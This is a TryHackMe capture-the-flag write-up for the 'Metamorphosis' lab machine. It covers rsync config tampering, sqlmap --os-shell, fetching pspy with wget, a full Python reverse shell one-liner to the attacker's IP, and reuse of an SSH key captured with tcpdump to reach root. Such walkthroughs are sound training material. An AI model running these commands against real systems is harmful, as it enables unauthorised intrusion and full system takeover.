---
Platform: TryHackMe
Difficulty: Medium
Status: Rooted/Finished
Type: Machine
Title: Metamorphosis
Category: 
tags: 
CreatedOn: 04-12-2023
---
# Metamorphosis

  

In this writeup we are going to solve the Metamorphosis room from TryHackMe.

Link to the Room : [https://tryhackme.com/room/metamorphosis](https://tryhackme.com/room/metamorphosis)

  

Let’s Start 🙌

  

Start the machine and take a note of the IP Address:

![Untitled.png](Metamorphosis/assets/Untitled.png)

In my case the Target machine’s ip address is :

IP_ADDR = 10.10.15.229

### Step - 1 : Basic Enumeration

Firstly, we could run an nmap scan on the target machine.

**Command** : `nmap -T4 -A -v <IP-ADDR>`

![Untitled 1.png](Metamorphosis/assets/Untitled%201.png)

![Untitled 2.png](Metamorphosis/assets/Untitled%202.png)

From the obtained nmap result we could se that there is a `apache` webserver running on `port 80` and we could also see some samba shares. We can also see a `rsync` is running on `port 873`.

  

Now we can implement directory enumeration on `port 80`. For this purpose I am using `gobuster` for directory enumeration. You can use any tool of your choice.

**Command** for `gobuster` : `gobuster dir -u http://<IP-ADDR> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![Untitled 3.png](Metamorphosis/assets/Untitled%203.png)

On running `gobuster` we have found `/admin`page. Now we can check this site for any clues….

`http://10.10.15.229/admin/` The site returns `403 Forbidden`.

![Untitled 4.png](Metamorphosis/assets/Untitled%204.png)

  

Since, the `/admin` page returns `403 Forbidden` , we can try some other ways to break the target.

### Step - 2 : Enumerating rsync

We can try to enumerate the shared folders using `rsync` service that we found on `port 873`.

First we can use the nmap `rsync-list-modules` script to enumerate the folders.

**Command** : `nmap -sV --script "rsync-list-modules" -p <PORT> <IP-ADDR>`

Note : In this case the `port` is `873`

![Untitled 5.png](Metamorphosis/assets/Untitled%205.png)

We have found two shared directories namely `Conf` and `All Confs` . Now we can manually enumerate the directories using the `rsync` service.

**Command** : `rsync -av --list-only rsync://<IP-ADDR>/<SHARED-FOLDER-NAME>`

![Untitled 6.png](Metamorphosis/assets/Untitled%206.png)

We can see that the Conf folder consists of config files. We can also see a `webapp.ini` file which sounds interesting because it stores the important configurations of the website that is hosted.

We can download that file using the following command to see the contents of that file.

**Command** : `rsync -av rsync://<IP-ADDR>/<SHARED-FOLDER-NAME>/<FILE-NAME> <DESTINATION-LOCATION>`

![Untitled 7.png](Metamorphosis/assets/Untitled%207.png)

  

After downloading the file open the file with a text editor of your choice. In my case I am using the `nano` text editor.

![Untitled 8.png](Metamorphosis/assets/Untitled%208.png)

  

We could see that the `env` variable is set to `prod`. Now we can edit/set the `env` variable to `dev` so we can make the site to give developer access to us.

![Untitled 9.png](Metamorphosis/assets/Untitled%209.png)

After editing the file save it. Now we can upload this file to the shared folder using `rsync` service using the following command.

**Command :** `rsync -av <EDITED-FILE-LOCATION> rsync://<IP-ADDR>/<SHARED-FOLDER-NAME>/<FILE-NAME>`

![Untitled 10.png](Metamorphosis/assets/Untitled%2010.png)

After uploading the file, if we check the `http://<IP-ADDR>/admin/` site we can see a webpage stating get the info of users.

![Untitled 11.png](Metamorphosis/assets/Untitled%2011.png)

  

While intercepting the traffic with burpsuite, If we try some random username on the Username field we can see that the request is send to a `/config.php` path and the name that we typed in the username field is set to a `username` variable.

![Untitled 12.png](Metamorphosis/assets/Untitled%2012.png)

From the stuff we got we can try try to obtain a shell using `sqlmap.`

**Command :** `sqlmap -u http://<IP-ADDR>/admin/config.php --batch --data=username=hi --level=5 --risk=3 --os-shell`

![Untitled 13.png](Metamorphosis/assets/Untitled%2013.png)

![Untitled 14.png](Metamorphosis/assets/Untitled%2014.png)

We can see that we have obtained a `os-shell`.

Now we can check the user directory. When I tried to change the directory it wasn’t possible. So I tried listing the directories and found the `user.txt` file.

  

![Untitled 15.png](Metamorphosis/assets/Untitled%2015.png)

  

And viola, we have obtained the user flag.. Now we have to obtain the root flag

Now, we have to escalate our privileges to obtain the root flag. First, we will find all the running processes that are running on our target machine. For that, we are going to use a tool called [pspy](https://github.com/DominicBreuker/pspy). You can also use other tools such as [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for this purpose. In this challenge, I am going to use the pspy tool.

Download the tool to your local machine. We have to transfer this file from our local machine to the target machine because tryhackme rooms don’t have an internet connection. So, we will first download the pspy tool to our local machine. After downloading, create a Python simple HTTP server in the same directory where you downloaded the pspy tool. The command for creating a Python simple HTTP server is: `python -m http.server`. This command will host a simple web server with your current working directory as the root of the web server, which is accessed by your machine's IP address on port `8000`.

  

![Untitled 16.png](Metamorphosis/assets/Untitled%2016.png)

Now you can use the `wget` command to download the pspy tool to the target machine. Since, you are connected to tryhackme via the openvpn, which implies that your target machine can reach your local machine via the openvpn tunnel and vice versa. By this way we can download the pspy tool to the target machine from our local machine.

The command is : `wget http://<tun0-IPaddress>:8000/pspy32`

  

![Untitled 17.png](Metamorphosis/assets/Untitled%2017.png)

  

Now we have successfully downloaded the pspy tool to the target machine. Now to run the pspy tool, first we have update the permissions of the pspy file to executable permissions. For that we use the command : `chmod +x pspy`

  

![Untitled 18.png](Metamorphosis/assets/Untitled%2018.png)

  

![Untitled 19.png](Metamorphosis/assets/Untitled%2019.png)

I tried to run the file but it showed no output. This is because the shell that is obtained via sqlmap has limited capabilities. So we can try to obtain a reverse shell to the target machine.

I am going to use the following python reverse shell command to obtain the revers hell.

First start a netcat listener. The command is : `nc -lvnp 1234`

![Untitled 20.png](Metamorphosis/assets/Untitled%2020.png)

After starting the netcat listener, run this command on the target machine with the ip address as tun0 ip address to obtain the reverse shell.

  

```
export RHOST="<tun0 IP Address>";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

  

If the command is successfully executed you should have obtained the reverse shell.

  

![Untitled 21.png](Metamorphosis/assets/Untitled%2021.png)

  

Now try to run the pspy tool.

![Untitled 22.png](Metamorphosis/assets/Untitled%2022.png)

  

Now you can see that the pspy tool is running.

  

![Untitled 23.png](Metamorphosis/assets/Untitled%2023.png)

  

If you check the output of the pspy file, you can see a suspicious `curl` request to [`http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12`](http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12) .

We can use `tcpdump` to capture the request to check what’s the request is all about and also the response for this request. To run `tcpdump` run the following command:

`tcpdump -i lo -w tcpdump.pcap`

Here,

`-i` - interface [ in this case `lo`( loop back address i.e, 127.0.0.1 ) ]

`-w` - Write the output to the mentioned file name

![Untitled 24.png](Metamorphosis/assets/Untitled%2024.png)

  

Leave the `tcpdump` to capture the traffic for a minute or two and press `ctrl + c` end `tcpdump`.

![Untitled 25.png](Metamorphosis/assets/Untitled%2025.png)

  

Again start the netcat listener and once again obtain the reverse shell to proceed further.

Now after obtaining the reverse shell again try to see the contents of the `tcpdump.pcap` file using the cat command : `cat tcpdump.pcap`

  

![Untitled 26.png](Metamorphosis/assets/Untitled%2026.png)

  

You can see a SSH Key in the pcap file which the response to the suspicious curl request [`http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12`](http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12) .

  

Now copy this ssh key and store it in a file in your local machine. In my case I storing it file named `id_rsa`. Change the file permissions using the following command : `chmod 600` `**id_rsa**`

  

Now we can use this SSH key to login to the target machine. But we don’t know the user name. So I am going to try `root` as the username [ mostly the default username for root ].

The command is : `ssh -i id_rsa root@<TARGET_IP_ADDRESS>`

  

![Untitled 27.png](Metamorphosis/assets/Untitled%2027.png)

  

Now we got access to the root user.

![Untitled 28.png](Metamorphosis/assets/Untitled%2028.png)

  

Finally We got the root user’s flag.

  

Thank You.